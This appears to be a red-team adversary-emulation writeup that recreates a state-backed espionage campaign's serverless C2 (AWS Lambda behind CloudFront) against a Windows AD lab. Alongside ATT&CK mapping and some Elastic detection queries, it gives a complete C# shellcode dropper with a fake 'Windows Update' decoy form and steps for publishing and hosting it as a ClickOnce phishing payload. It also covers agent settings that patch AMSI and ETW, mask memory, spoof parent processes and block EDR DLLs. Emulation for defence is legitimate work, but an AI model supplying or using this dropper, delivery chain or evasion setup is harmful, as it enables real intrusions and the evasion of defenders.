---
title: "Adversary Emulation of a state-backed APT (CL-STA-1020) with Serverless Functions"
kicker: "Evasion Engineering . Adversary Emulation . Serverless Infrastructure"
tags: "Evasion Engineering . APT Emulation . Serverless . AWS Lambda . CloudFront"
lead: "Full adversary emulation of HazyBeacon (CL-STA-1020), a state-backed campaign that runs its entire command-and-control on serverless cloud functions. Every TTP is grounded in published threat intelligence and replicated in a Windows AD lab."
---

> **Living-off-the-Trusted-Cloud: Adversary Emulation of a State-Backed Serverless C2 Campaign**
>
> This is a adversary emulation for HazyBeacon (CL-STA-1020), a state-backed espionage campaign targeting Southeast Asian governments. Every phase maps the real threat actor's TTPs in a Windows lab environment. Every TTP is grounded in published threat intelligence with citations.

---

## 1 - Threat Intelligence Summary

### Campaign Overview

**Designation:** CL-STA-1020 (Palo Alto Unit 42 tracking name)
**Malware Family:** HazyBeacon
**First Reported:** Late 2024 (Unit 42 tracking), publicly disclosed June-July 2025
**Attribution:** State-backed APT, suspected Chinese nexus
**Targets:** Southeast Asian government agencies (diplomatic, defense, trade, energy sectors)
**Objective:** Cyber espionage. Collection of diplomatic correspondence, defense plans, trade dispute documentation, and energy sector data

### What Makes HazyBeacon Unique

![HazyBeacon Overview](writeups/images/hazybeacon-emulation/hazybeacon-overview.png)

The threat actor's entire command-and-control infrastructure runs on serverless cloud functions (AWS Lambda), with traffic going through trusted cloud domains. The C2 server is the cloud infra. Network defenders see HTTPS calls to `*.lambda-url.ap-southeast-1.on.aws` and `*.cloudfront.net`, domains that are allowlisted and seem harmless in almost every enterprise environment.

The campaign uses these core techniques:

1. **ClickOnce deployment** via phishing links to a fake hardware analysis site hosted on Azure, delivering a .NET loader
2. **AppDomainManager hijacking** to inject the OneClikNet.NET loader into the ClickOnce host process (`dfsvc.exe`)
3. **In-memory shellcode execution** with multi-layer encryption (AES-128-CBC, RC4) and anti-debugging/sandbox detection
4. **AWS Lambda Function URLs** as the primary C2 channel, making traffic indistinguishable from legitimate cloud API calls
5. **CloudFront CDN** as a relay layer in front of Lambda, adding domain fronting capability and further blending into CDN traffic
6. **Go-based RunnerBeacon backdoor** with shell commands, file operations, and network capabilities


---

## 2 - MITRE ATT&CK Mapping

This is the complete ATT&CK mapping for HazyBeacon, cross-referenced across all three research sources. The "Phantom/Adaptix Emulation" column shows how each TTP is replicated.

This mapping covers the Trellix OneClik infection chain emulated in this writeup: Initial Access, Loader Execution, Shellcode Stage, and C2 Beacon.

| ID | Technique | OneClik / HazyBeacon Implementation | Phantom/Adaptix C2 Emulation |
|----|-----------|--------------------------------------|----------------------|
| **T1566.002** | Phishing: Spearphishing Link | Email with link to fake hardware analysis site on Azure, delivers ClickOnce manifest | ClickOnce deployment hosted on operator machine, delivered via URL to target |
| **T1204.002** | User Execution: Malicious File | User clicks ClickOnce install link, dfsvc.exe deploys the .NET application | User clicks Install on ClickOnce publish page, dfsvc.exe deploys UpdateHelper.exe |
| **T1055** | Process Injection | OneClikNet.NET loader injects encrypted shellcode via AppDomainManager hijacking | Eclipse PIC shellcode injected in-process via VirtualAlloc + CreateThread from .NET dropper |
| **T1106** | Native API | VirtualAlloc, CreateThread for in-memory shellcode execution | Same. UpdateHelper.exe calls VirtualAlloc/CreateThread to run Eclipse shellcode |
| **T1027** | Obfuscated Files or Information | Multi-layer encoding: Base64, zip, AES-128-CBC, RC4, character substitution | Eclipse shellcode embedded as .NET resource, AES-128-GCM wire encryption |
| **T1140** | Deobfuscate/Decode Files | Runtime decryption of shellcode payload before execution | Eclipse agent runtime config decryption from template blob |
| **T1622** | Debugger Evasion | Anti-debugging thread loops (Debugger.IsAttached, NtQueryInformationProcess), sandbox detection | Eclipse guardrails (environment checks before execution) |
| **T1562.006** | Impair Defenses: ETW | OneClik patches EtwEventWrite/NtTraceEvent to blind telemetry | `config amsi_etw_bypass all` on Eclipse agent |
| **T1071.001** | Application Layer Protocol: Web Protocols | RunnerBeacon HTTPS beaconing to Lambda URLs and CloudFront | Eclipse agent HTTPS beaconing to Lambda relay via CloudFront |
| **T1102.002** | Web Service: Cloud API | Lambda Function URLs as C2 endpoints, CloudFront CDN as relay | Phantom's native architecture: Lambda relay + CloudFront CDN. 1:1 match. |
| **T1059** | Command and Scripting Interpreter | RunnerBeacon provides shell command execution | Eclipse agent shell commands via BOF dispatch |
| **T1105** | Ingress Tool Transfer | RunnerBeacon file upload/download capabilities | Eclipse agent `upload` / `download` commands |

---

## 3 - Architecture Comparison: HazyBeacon vs Phantom C2

This is why Phantom C2 is uniquely suited for this emulation. The architectures are structurally identical.

> [Phantom](https://github.com/phantom-framework) is a custom Serverless command-and-control framework built to mirror how modern red teaming operations are conducted, separating the attack surface from the operator. 
> With native support for AWS, Azure, and GCP. Agents communicate exclusively with serverless cloud functions that relay encrypted data through managed databases. 
> The teamserver polls the database from your internal network. No listening ports, no static infrastructure, no single point of failure.
> For air-gapped, on-prem, and classified environments, a standalone Phantom Listener replaces cloud infrastructure. Which runs separate from the Teamserver.

> [!NOTE]
> **Want to replicate this with open-source tooling?** You can reproduce this entire emulation using [Adaptix C2](https://github.com/Jeikson/adaptix) with the [adaptix-serverless-c2](https://github.com/stillbigjosh/adaptix-serverless-c2) plugin, which adds the same Lambda relay + CloudFront CDN architecture to Adaptix. The ClickOnce delivery and detection queries are framework-agnostic.

### OneClik / HazyBeacon Architecture (Trellix)

```
Target Host                         Threat Actor Infrastructure
+-----------------+                 +-------------------+
| dfsvc.exe       |                 |  CloudFront CDN   |
|  -> ClickOnce   |   HTTPS         |  (trusted domain) |
|  -> .NET Loader |---------------->+--------+----------+
|  -> RunnerBeacon|                          |
|  (in-memory)    |                 +--------v----------+
+-----------------+                 |  AWS Lambda        |
                                    |  Function URL      |
                                    |  (.lambda-url.     |
                                    |   ap-southeast-1   |
                                    |   .on.aws)         |
                                    +--------+----------+
                                             |
                                    +--------v----------+
                                    |  Operator          |
                                    |  (polls Lambda)    |
                                    +-------------------+
```

### Phantom C2 / Adaptix Severless C2 Architecture 

```
Target Host                         Phantom C2 Infrastructure
+-----------------+                 +-------------------+
| Eclipse Agent   |   HTTPS         |  CloudFront CDN   |
|  (ClickOnce     |---------------->|  (d1234.cf.net)   |
|   shellcode)    |                 +--------+----------+
|                 |                          |
+-----------------+                 +--------v----------+
                                    |  AWS Lambda Relay  |
                                    |  (.lambda-url.     |
                                    |   <region>.on.aws) |
                                    +--------+----------+
                                             |
                                    +--------v----------+
                                    |  DynamoDB          |
                                    +--------+----------+
                                             |
                                    +--------v----------+
                                    |  Teamserver        |
                                    |  (polls DynamoDB)  |
                                    +-------------------+
```

### Side-by-Side Mapping

| OneClik / HazyBeacon Component | Phantom C2 Equivalent | Match Fidelity |
|-------------------------------|----------------------|----------------|
| ClickOnce delivery via phishing | ClickOnce .NET dropper with embedded Eclipse shellcode | Exact. Same delivery mechanism, same user interaction model. |
| dfsvc.exe ClickOnce host process | dfsvc.exe launches UpdateHelper.exe | Exact. Same process chain. |
| AppDomainManager / .NET loader | Direct shellcode injection (VirtualAlloc + CreateThread) | Divergence. APT uses AppDomainManager hijacking (.config CLR hook); emulation uses direct P/Invoke from the .NET dropper. Same result: in-memory shellcode from a .NET context. |
| RunnerBeacon (Go backdoor) | Eclipse agent (PIC shellcode) | High. Both are in-memory C2 beacons with shell, file, and network capabilities. |
| Lambda Function URL C2 | Lambda Relay Function | Exact. Both use Lambda Function URLs for agent check-in over HTTPS. |
| CloudFront CDN relay | CloudFront CDN Relay (`--cloudfront` flag) | Exact. Both put CloudFront in front of Lambda to blend into CDN traffic. |
| AES-128-CBC + RC4 wire encryption | AES-128-GCM wire encryption | High. Both use AES-based wire encryption for all agent-teamserver communication. |
| Anti-debugging / sandbox detection | Eclipse guardrails (environment checks) | High. Both check execution environment before running. |

**The critical insight:** Phantom C2's Lambda relay architecture IS the same C2 channel used by the Threat actor. Both use AWS Lambda Function URLs with HTTPS, CloudFront CDN fronting, and serverless compute for stateless relay. A network defender looking at Phantom traffic sees exactly what they would see from HazyBeacon.

---

## 4 - Lab Environment

### Lab Topology

| Host | Role | IP | OS | Domain |
|------|------|----|----|--------|
| DC01 | Primary DC | 10.1.10.10 | Windows Server 2019 | sevenkingdoms.local |
| DC02 | Child DC | 10.1.10.11 | Windows Server 2019 | north.sevenkingdoms.local |
| SRV02 | Member server | 10.1.10.22 | Windows Server 2019 | north.sevenkingdoms.local |
| Elastic | SIEM/EDR | 10.1.20.2 | Debian (Docker) | N/A |
| Phantom C2 Teamserver | C2 server | Operator machine (over WireGuard) | Linux | N/A |

### Phantom C2 Infrastructure (AWS)

| Component | Service | Purpose |
|-----------|---------|---------|
| Lambda Relay | AWS Lambda + Function URL | Stateless relay between Eclipse agents and teamserver |
| CloudFront CDN | AWS CloudFront Distribution | CDN fronting for Lambda relay. Agent connects to `d<id>.cloudfront.net` |
| DynamoDB | AWS DynamoDB | Persistent storage for agent records, tasks, inbound/outbound data |
| Teamserver | Phantom Server binary | Polls DynamoDB, serves operator web UI, processes agent check-ins |

### Network Flow

```
Lab VMs (10.1.10.0/24)
        |
        | HTTPS (port 443)
        v
CloudFront CDN (d<id>.cloudfront.net)
        |
        | HTTPS (origin request)
        v
Lambda Relay (.lambda-url.<region>.on.aws)
        |
        | DynamoDB read/write
        v
DynamoDB Tables
        ^
        | Poll loop
        |
Phantom Teamserver (operator machine, over WireGuard)
        |
        | Operator web UI (:50050)
        v
Operator Browser
```

### Prerequisites

Before starting the emulation:

1. AD environment deployed and healthy (all 3 Windows VMs + router)
2. Elastic stack deployed with agents on all Windows hosts
3. Elastic Defend + Windows integration + Sysmon enabled
4. Detection rules enabled in Kibana (relevant ATT&CK techniques)
5. Phantom C2 deployed on AWS with `--cloudfront` flag
6. WireGuard tunnel active from operator machine to the lab network
7. Callback rules configured to allow lab VMs to reach the internet (CloudFront)
8. Snapshot taken before emulation (e.g. `ludus --user $LAB_USER snapshots create pre-hazybeacon-emulation`)

### Allowing Outbound Cloud Traffic & WireGuard callbacks

Ensure the network rules permit outbound HTTPS from VLAN 10:

```yaml
network:
  wireguard_vlan_default: ACCEPT
  rules:
    - name: Allow VLAN 10 callbacks to WireGuard
      vlan_src: 10
      vlan_dst: wireguard
      protocol: all
      ports: all
      action: ACCEPT
```

Block `*.elastic.co` at the DNS level on the router in order to stop Elastic from phoning home and sending our telemetry data

---

## 5 - Phase 1: C2 Infrastructure (Living-off-the-Trusted-Cloud)

> **Emulates:** HazyBeacon's use of AWS Lambda Function URLs and CloudFront CDN for C2 communication
> **ATT&CK:** T1102.002 (Web Service: Cloud API), T1071.001 (Application Layer Protocol: Web Protocols)

### Deploy Phantom C2 on AWS with CloudFront

This is the foundation of the entire emulation. Phantom C2 or Adaptix Severless C2 plugin's Lambda relay + CloudFront CDN architecture is a 1:1 match for HazyBeacon's C2 infrastructure.

From the operator machine, using the `phantom-deploy` repository:

```bash
cd ~/Downloads/phantom-deploy

# Deploy with CloudFront CDN enabled
sudo ./deploy.sh --dist ~/Downloads/phantom-c2-dist -p <team-password> --cloudfront
```

> [!NOTE]
> **Adaptix alternative:** If you are using the [adaptix-serverless-c2](https://github.com/stillbigjosh/adaptix-serverless-c2) plugin, deploy with `./scripts/install.sh /path/to/AdaptixC2` following the plugin README. The resulting infrastructure (Lambda + CloudFront + DynamoDB) is identical.


![Phantom deploy with CloudFront](writeups/images/hazybeacon-emulation/phantom-deploy-cloudfront.png)

The deploy script provisions:
- Lambda relay function with a Function URL
- DynamoDB tables for agent/task storage
- CloudFront distribution in front of the Lambda relay
- KMS key for encryption at rest

After deployment, we noted its outputs:

- CloudFront domain (this is what agents connect to) e.g., d1234abcdef.cloudfront.net

- Lambda Function URL (hidden behind CloudFront, for verification only) e.g., xyz123.lambda-url.us-east-1.on.aws

### Verify CloudFront Relay

Should return 400 (relay works, no agent data)

```bash
curl -s -o /dev/null -w "%{http_code}" https://d1234abcdef.cloudfront.net/relay
```

![CloudFront relay verification](writeups/images/hazybeacon-emulation/cloudfront-relay-verify.png)

Verify CloudFront headers (Expected: Via: ... CloudFront, X-Cache: Miss from cloudfront)

```bash 
curl -sI https://d1234abcdef.cloudfront.net/relay 2>&1 | grep -i "x-cache\|via"
```

![CloudFront headers](writeups/images/hazybeacon-emulation/cloudfront-headers-verify.png)

### Start the Teamserver

```bash
cd /opt/phantom-c2 && ./phantom-server
```

![Teamserver startup](writeups/images/hazybeacon-emulation/teamserver-start.png)

Open the operator UI at `https://<teamserver-ip>:50050` and log in.

### Configure the Malleable Communication Profile

HazyBeacon's traffic appears as normal HTTPS to AWS domains. We configured the CloudFront profile to match:

**cloudfront.json in the Profiles widget** (already ships with Phantom):

We can replace `CLOUDFRONT_DOMAIN_HERE` with our actual CloudFront distribution domain directly or we'd let the Phantom Payload Generator do it for us when generating payloads. 

![CloudFront profile configuration](writeups/images/hazybeacon-emulation/cloudfront-profile.png)

### Why This Matters for Detection

At this point, any agent callback from a lab VM will appear in Elastic and on the network as:

- **Destination:** `d1234abcdef.cloudfront.net` (a legitimate AWS CloudFront domain)
- **Protocol:** TLS 1.3 over port 443
- **SNI:** `d1234abcdef.cloudfront.net`
- **Certificate:** Valid Amazon-issued certificate
- **Traffic pattern:** Normal HTTPS POST/GET requests

This is identical to what HazyBeacon's targets saw. Enterprise firewalls, web proxies, and EDR products typically do not block or alert on CloudFront traffic. This is the "living-off-the-trusted-cloud" technique.


---

## 6 - Phase 2: Initial Access (ClickOnce Delivery)

> **Emulates:** OneClik campaign's ClickOnce delivery + HazyBeacon's shellcode execution
> **ATT&CK:** T1204.002 (User Execution: Malicious File), T1566.002 (Spearphishing Link), T1055.012 (Process Injection: Process Hollowing)

### Threat Intelligence Context

The OneClik campaign (Trellix) delivers the payload via ClickOnce deployment. The user clicks a link, ClickOnce installs and runs a .NET application that loads shellcode directly in memory. No files are dropped to disk. This matches the real-world infection chain: Phishing Email → Fake Hardware Analysis Site → ClickOnce Deployment → dfsvc.exe → Shellcode Execution → C2 Beacon.

The OneClik campaign additionally used `ZSATray.exe` (Zscaler), `umt.exe` (Citrix), and `ied.exe` (Sony Imaging Edge Desktop) as alternative DLL hijacking hosts.

### Generate Eclipse Shellcode (bin format)

Eclipse is the default WIndows agent of Phantom C2, this Windows agent is heavily inspired by Kharon Agent of Adaptix, but much more evasive and feature rich. 

Generate Eclipse as raw PIC shellcode (`.bin`) for embedding in the ClickOnce dropper.

**Web UI method:**
1. Navigate to **Payloads > Generate**
2. Select agent: **Eclipse**
3. Format: **bin** (raw PIC shellcode)
4. Profile: **cloudfront** (the profile configured in Phase 1)
5. Sleep: **10** seconds (HazyBeacon used regular beaconing intervals)
6. Jitter: **30** percent
7. Click **Generate**
8. Download the output as `eclipse.bin`

The `bin` format produces a raw PIC (position-independent code) shellcode blob with no PE headers and no DLL structure.

![Eclipse payload generation step 1](writeups/images/hazybeacon-emulation/eclipse-generate-1.png)

![Eclipse payload generation step 2](writeups/images/hazybeacon-emulation/eclipse-generate-2.png)

### Deliver and Execute via ClickOnce

ClickOnce is the delivery mechanism that matches the OneClik campaign exactly. The user clicks a link, the ClickOnce installer runs the application. Delivery and execution happen in a single user interaction, just like the real campaign.

#### Step 1: Create the ClickOnce Dropper Application

In Visual Studio, create a **Windows Forms App (.NET Framework)** project. Name it something that looks legitimate (e.g., `UpdateHelper`, `PolicyViewer`, `DocumentReaderSetup`).

Add the Eclipse shellcode as an embedded resource:
1. In Solution Explorer, expand **Properties** and double-click **Resources.resx** (the green icon file)
2. In the resource editor, click **Add Resource > Add Existing File...**
3. Browse to and select `eclipse.bin`
4. It appears in the resource list as `eclipse`, accessible via `Properties.Resources.eclipse`

![Eclipse shellcode as embedded resource](writeups/images/hazybeacon-emulation/eclipse-resource.png)

Replace `Program.cs` with the dropper logic:

```csharp
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace UpdateHelper
{
    static class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr addr, uint size,
            uint type, uint protect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr addr, uint size,
            uint newProtect, out uint oldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr attr, uint stackSize,
            IntPtr startAddr, IntPtr param, uint flags, out uint threadId);

        [STAThread]
        static void Main()
        {
            try
            {
                byte[] sc = Properties.Resources.eclipse;

                IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length,
                    0x3000, 0x04);

                Marshal.Copy(sc, 0, mem, sc.Length);

                uint old;
                VirtualProtect(mem, (uint)sc.Length, 0x20, out old);

                uint tid;
                CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out tid);
            }
            catch { }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());

            System.Threading.Thread.Sleep(System.Threading.Timeout.Infinite);
        }
    }
}
```

![Dropper code in Visual Studio](writeups/images/hazybeacon-emulation/dropper-code.png)

> **Important:** In Project > Properties > Build, uncheck **"Prefer 32-bit"** (or set Platform target to **x64**). Eclipse shellcode is x64 and will crash silently in a 32-bit process. **To set as x64**: Project > Properties > Build tab, uncheck “Prefer 32-bit”. Or change Platform target to x64.

This dropper reads `eclipse.bin` from the embedded resource (no file drop to disk), allocates RW memory, copies the shellcode, flips to RX, and runs Eclipse in a background thread. The decoy form shows for 8 seconds then closes, but the process stays alive silently so Eclipse keeps beaconing. The shellcode never touches disk.

Make `Form1` look like a legitimate utility. A simple "Updating... please wait" progress bar that closes after a few seconds works well. Or a fake document viewer, policy reader, etc. The decoy only needs to keep the user from getting suspicious.

```csharp
using System;
using System.Drawing;
using System.Windows.Forms;

namespace UpdateHelper
{
    public partial class Form1 : Form
    {
        private Timer closeTimer;

        public Form1()
        {
            InitializeComponent();

            this.Text = "Windows Update";
            this.Size = new Size(400, 150);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.MinimizeBox = false;

            Label label = new Label();
            label.Text = "Updating... please wait";
            label.Font = new Font("Segoe UI", 11);
            label.AutoSize = true;
            label.Location = new Point(30, 20);
            this.Controls.Add(label);

            ProgressBar bar = new ProgressBar();
            bar.Style = ProgressBarStyle.Marquee;
            bar.MarqueeAnimationSpeed = 30;
            bar.Size = new Size(340, 25);
            bar.Location = new Point(30, 55);
            this.Controls.Add(bar);

            closeTimer = new Timer();
            closeTimer.Interval = 8000;
            closeTimer.Tick += (s, e) => this.Close();
            closeTimer.Start();
        }
    }
}
```

![Decoy form design](writeups/images/hazybeacon-emulation/decoy-form.png)

#### Step 2: Publish via ClickOnce

1. **Build > Publish** in Visual Studio
2. Set the publishing folder to a local directory (e.g., `C:\ClickOncePublish\`)
3. Choose **From a Web site** as the install method
4. Set the installation URL to your operator machine's WireGuard IP: `http://<operator-wireguard-ip>`
5. Click **Finish**

![ClickOnce publish wizard](writeups/images/hazybeacon-emulation/clickonce-publish.png)

This generates:
- `setup.exe` (bootstrapper)
- `UpdateHelper.application` (deployment manifest)
- `Application Files/` directory with the versioned payload
- `Publish.htm` (landing page with the Install button)

If the Publish fails: 

The `Form1.Designer.cs` still has a reference to the old `Form1_Load` event handler. Open **Form1.Designer.cs** and find the line that looks like:

```csharp
this.Load += new System.EventHandler(this.Form1_Load);
```

Delete that line, then rebuild. The error will be gone.
#### Step 3: Host on the Operator Machine

From your operator machine (WireGuard-connected to the lab range), serve the publish directory:

```bash
cd /path/to/ClickOncePublish/
python3 -m http.server 80
```

Or for a more realistic setup with proper MIME types:

```bash
# Using PHP's built-in server (handles .application MIME type)
cd /path/to/ClickOncePublish/
php -S 0.0.0.0:80
```
#### Step 4: Execute on castelblack (SRV02)

This simulates the phishing click. RDP into castelblack as `samwell.tarly` and open the URL in a browser:

```
http://<operator-wireguard-ip>/publish.htm

http://198.51.100.2/publish.htm
```

![ClickOnce landing page](writeups/images/hazybeacon-emulation/clickonce-landing.png)

Click **Install**. The ClickOnce installer downloads `setup.exe`, which deploys the application. On first run, the dropper:

![ClickOnce install prompt](writeups/images/hazybeacon-emulation/clickonce-install.png)

Click **Run anyway**:

![SmartScreen run anyway](writeups/images/hazybeacon-emulation/clickonce-run-anyway.png)

What this does is:

1. Reads `eclipse.bin` shellcode from the embedded resource
2. Allocates memory (RW), copies shellcode, flips to RX
3. Launches Eclipse in a background thread
4. Shows the decoy "Updating..." form

![Decoy updating form on target](writeups/images/hazybeacon-emulation/decoy-updating.png)

The Eclipse agent starts calling back to the Lambda relay immediately. No files are written to disk.

We can then interact with it by right-clicking the beacon and hitting Console

![Eclipse agent console](writeups/images/hazybeacon-emulation/eclipse-console.png)

### What Happens on Execution

**ClickOnce delivery (primary):**
1. ClickOnce host process (`dfsvc.exe`) launches the `UpdateHelper.exe` dropper
2. Dropper reads `eclipse.bin` from embedded resource (never written to disk)
3. `VirtualAlloc` (RW), `Marshal.Copy`, `VirtualProtect` (RX), `Thread.Start`
4. Eclipse PEB-walks to resolve APIs, initializes AES encryption, begins HTTPS beaconing to CloudFront
5. Decoy form shows "Updating... please wait" for 8 seconds, then closes
6. Process stays alive, Eclipse beacons in the background
7. Network perspective: a .NET ClickOnce application making HTTPS calls to `cloudfront.net`

### Confirm Agent Check-In

![Eclipse agent check-in](writeups/images/hazybeacon-emulation/eclipse-checkin.png)

In the Phantom operator UI:
- The **Agents** tab should show a new Eclipse agent
- **Hostname:** `CASTELBLACK` (SRV02)
- **Username:** `NORTH\samwell.tarly`
- **Process:** `UpdateHelper.exe` (ClickOnce) 
- **Status:** Green (active)


Expected:
- Process tree shows the dropper process as the host

![Process tree](writeups/images/hazybeacon-emulation/process-tree.png)
### Troubleshooting

| Symptom                                                       | Cause                                            | Fix                                                                                                           |
| ------------------------------------------------------------- | ------------------------------------------------ | ------------------------------------------------------------------------------------------------------------- |
| No agent callback                                             | Eclipse shellcode not loaded correctly           | Check that `eclipse.bin` is in Resources.resx and accessible via `Properties.Resources.eclipse`               |
| App crashes silently (Defender off)                           | Project built as 32-bit, shellcode is x64        | Project > Properties > Build > uncheck "Prefer 32-bit" or set Platform target to x64                          |
| Agent dies after ~8 seconds                                   | Process exits when the decoy form closes         | Add `System.Threading.Thread.Sleep(System.Threading.Timeout.Infinite);` after `Application.Run(new Form1());` |
| ClickOnce "Application cannot be started"                     | Missing .NET Framework on target                 | Ensure .NET Framework 4.x is installed on castelblack                                                         |
| ClickOnce hash validation error                               | Rebuilt without republishing                     | Republish via Build > Publish after every code change                                                         |
| CS1061 Form1_Load error                                       | Designer.cs references old event handler         | Open Form1.Designer.cs, delete the `this.Load += new System.EventHandler(this.Form1_Load);` line              |
| `DecryptInbound error: cipher: message authentication failed` | Stale DynamoDB records from dead agent instances | Flush stale records (see below) then restart agent cleanly                                                    |

**Flushing stale DynamoDB inbound records:**

When an agent dies and restarts, stale encrypted records from the dead instance can remain in DynamoDB. The teamserver polls these and fails to decrypt them, flooding the log with `DecryptInbound` errors. Flush them with:

> This command syntax can come in handy if you are reproducing this writeup steps in your environment

```bash
aws dynamodb scan \
  --table-name phantom-inbound \
  --region us-east-1 \
  --filter-expression "agent_id = :aid AND #p = :p" \
  --expression-attribute-names '{"#p":"processed"}' \
  --expression-attribute-values '{":aid":{"S":"<AGENT-ID>"},":p":{"BOOL":false}}' \
  --projection-expression "id" \
  --output json \
  | jq -r '.Items[].id.S' \
  | while read id; do
      aws dynamodb delete-item \
        --table-name phantom-inbound \
        --region us-east-1 \
        --key "{\"id\":{\"S\":\"$id\"}}"
      echo "Deleted $id"
    done
```

Replace `<AGENT-ID>` with the short agent ID (e.g., `16ac14a7`), and adjust `phantom-inbound` and `us-east-1` to match your Dynamo-DB Table and AWS Zoning. Records will also TTL out automatically (default 24 hours).

### Detection Opportunities (Initial Access)

**ClickOnce execution chain (Sysmon Event ID 1, process creation):**

```
event.code:"1" AND process.parent.name:"dfsvc.exe" AND process.command_line:*LocalApps*
```

![ClickOnce detection in Elastic](writeups/images/hazybeacon-emulation/detection-clickonce.png)

**VirtualAlloc + VirtualProtect from a ClickOnce-launched process:**

```
event.code:"10" AND process.executable:*Apps\\2.0* AND winlog.event_data.CallTrace:*VirtualAlloc*
```

**Outbound HTTPS from ClickOnce app directory:**

```
event.code:"3" AND process.executable:*Apps\\2.0* AND destination.port:443
```

![Outbound HTTPS detection](writeups/images/hazybeacon-emulation/detection-outbound.png)

**Suspicious .NET process making HTTPS calls to CloudFront:**

```
event.code:"3" AND process.parent.name:"dfsvc.exe" AND destination.domain:*cloudfront.net
```

---

## 7 - Phase 3: Execution and Agent Establishment

> **Emulates:** HazyBeacon's backdoor establishing C2 communication via Lambda
> **ATT&CK:** T1071.001 (Web Protocols), T1573.002 (Encrypted Channel: Asymmetric Cryptography)

### Configure the Agent for Stealth

Once the Eclipse agent checks in, configure it to match HazyBeacon's operational profile. HazyBeacon is an espionage implant: low-and-slow, blend with legitimate traffic, minimize forensic artifacts.

| Setting                     | HazyBeacon Parallel                                  | Purpose                                                                                                                                                                                                  |
| --------------------------- | ---------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sleep 30` / `jitter 40`    | HazyBeacon uses regular but not aggressive beaconing | 30s base with 40% jitter = 18-42s between callbacks. Espionage pace.                                                                                                                                     |
| `blockdlls on`              | N/A (HazyBeacon does not use BOFs)                   | Block non-Microsoft DLLs in child processes. Prevents EDR from injecting hooks into sacrificial processes.                                                                                               |
| `mask.beacon timer`         | HazyBeacon encrypts in-memory artifacts              | Timer-queue sleep masking: encrypt beacon code section during sleep using ROP chain. Beacon is invisible to memory scanners while sleeping.                                                              |
| `mask.heap true`            | Complement to beacon masking                         | Encrypt heap allocations during sleep. Without this, strings and buffers remain readable while the beacon code is encrypted.                                                                             |
| `amsi_etw_bypass all`       | OneClik patches ETW (`EtwEventWrite`/`NtTraceEvent`) | Patch both AMSI (`AmsiScanBuffer`) and ETW before any .NET execution or script runs. Options: `all`, `amsi`, `etw`, `none`.                                                                              |
| `syscall spoof_indirect`    | Advanced evasion                                     | Indirect syscalls through `ntdll.dll` instruction addresses with spoofed call stack. Evades EDR hooks, CallTrace-based Sysmon, and stack-walking heuristics. Options: `spoof`, `spoof_indirect`, `none`. |
| `bofproxy true`             | Protect BOF API calls                                | Route BOF Win32 API calls through the beacon's internal proxy instead of calling directly. Hides BOF call origins from EDR hooking.                                                                      |
| `spawnto RuntimeBroker.exe` | HazyBeacon runs under a trusted process              | Sacrificial process for fork-and-run operations (postex fork, execute-assembly). RuntimeBroker.exe is a common Windows process that blends in.                                                           |
| `killdate.date 2026-12-31`  | OneClik had `kill_date: 2025-05-31`                  | Self-termination date (YYYY-MM-DD format). Agent self-destructs after this date. Standard operational security for controlled engagements.                                                               |

### Verify C2 Communication Path

Confirm the agent is communicating through CloudFront:

```
ipconfig
whoami
```

You can verify the traffic pattern on WireShark:

The traffic should appear as normal HTTPS to a CloudFront domain. No alerts should fire on the C2 channel itself. This is the point: the C2 channel is invisible to network-based detection.

---

## 8 - Phase 4: Defense Evasion

> **Emulates:** OneClik's evasion techniques (ETW patching, anti-debugging, obfuscation)
> **ATT&CK:** T1562.006 (Impair Defenses: ETW), T1622 (Debugger Evasion), T1027 (Obfuscated Files), T1140 (Deobfuscate/Decode)

### ETW and AMSI Patching

> Already configured in Phase 6.2:

```
config amsi_etw_bypass all
```

This patches both AMSI (`AmsiScanBuffer`) and ETW (`EtwEventWrite`, `NtTraceEvent`) before any .NET or script execution. This directly mirrors the OneClik campaign's ETW patching, which truncates `EtwEventWrite` with `xor rax,rax; retn`.

### Sleep Masking (Memory Encryption)

> Already configured in Phase 6.2:

```
config mask.beacon timer
config mask.heap true
```

During sleep, the Eclipse agent:
1. Flips beacon memory to RW
2. Encrypts the beacon code section
3. Sleeps using timer-queue callbacks with ROP chain
4. Wakes, decrypts, flips back to RX

This prevents memory scanners from finding the beacon during sleep, matching HazyBeacon's in-memory stealth profile.

### Indirect Syscalls with Stack Spoofing

> Already configured in Phase 6.2:

```
config syscall spoof_indirect
```

All Nt* API calls route through `ntdll.dll` instruction addresses with a spoofed call stack. This evades:
- EDR hooks on ntdll.dll
- CallTrace-based Sysmon detections
- Stack-walking heuristics

### Process Argument Spoofing and PPID Spoofing

When executing commands that spawn child processes, spoof both the command-line arguments and the parent PID to blend into normal process trees:

First, find a legitimate process e.g svchost.exe PID to use as parent process list.

```
config ppid <pid>
config spoofarg <Fake command line arguments>
```

- `ppid 808`: Any child process Eclipse spawns (via `shell`, `process create`, or fork-and-run) will appear to have `svchost.exe` (PID 808) as its parent instead of the ClickOnce host process. This breaks process-tree-based detection heuristics.
- `spoofarg`: The child process PEB shows your spoofed arguments as the command line, even though the actual process is different. Tools that read the PEB (like Process Explorer, Task Manager, and most EDR agents) see the spoofed arguments.

### DLL Blocking in Child Processes

```
config blockdlls on
```

When Eclipse spawns a child process for fork-and-run operations (execute-assembly, postex fork), the child is created with a mitigation policy that blocks non-Microsoft-signed DLLs from loading. This prevents EDR agents from injecting their hooking DLLs into the sacrificial process, making in-memory detections significantly harder.

---

## 9 - Phase 5: Discovery and Reconnaissance

> **Emulates:** HazyBeacon's intelligence gathering on the target network
> **ATT&CK:** T1087.002, T1069.002, T1046, T1482, T1135

### Host Enumeration

```
systeminfo
whoami
```

### Domain Enumeration via LDAP BOFs

Using the Extension-Kit AD-BOF `ldapsearch` module (inline BOF, no child process, no Sysmon network telemetry):

```
# Enumerate all domain users
ldapsearch (objectClass=user) -a sAMAccountName,description,memberOf,lastLogon,servicePrincipalName,userAccountControl

# Enumerate computers
